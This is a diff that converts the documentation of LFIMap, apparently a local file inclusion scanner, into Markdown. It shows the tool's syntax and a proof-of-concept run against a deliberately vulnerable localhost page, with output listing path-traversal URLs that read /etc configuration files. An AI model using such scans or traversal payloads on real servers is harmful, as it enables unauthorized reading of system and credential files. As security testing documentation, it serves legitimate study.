@@ -1,6 +1,8 @@
-Usage
-Syntax
+## Usage
 
+### Syntax
+
+```
 $ python lfimap.py -t <target> [options]
 
 Options
@@ -25,20 +27,26 @@ Options
 
 --hexa, -x
     Encode the url to hexa
+```
 
-Examples
-Example #1: PoC
-Description
+## Examples
+
+### Example #1: PoC
+
+#### Description
 
 The following example is based on a specific vulnerable code (download it here) that doesn't properly check/sanitize user inputs and is hence vulnerable to LFI attacks. LFIMap has been tested against this application as a Proof of Concept.
 Stdout
 
 LFIMap has been called with following parameters:
 
+```
 $ python lfimap.py -t "http://127.0.0.1/poc/LFI/index.php?page=page2.txt" -o report.html
+```
 
 Here is the output on the screen:
 
+```
  lfi detected in "page" parameter
 --------------------------------------------------------------------
 Made by Augusto Pereyra
@@ -95,7 +103,9 @@ http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/xdg/user-dirs.conf&
 File Found: 
 http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/gnome-vfs-2.0/modules/default-modules.conf&
 (...TRUNCATED...)
+```
 
+## Wiki
 
 More info in this site:
 https://www.aldeid.com/wiki/Lfimap
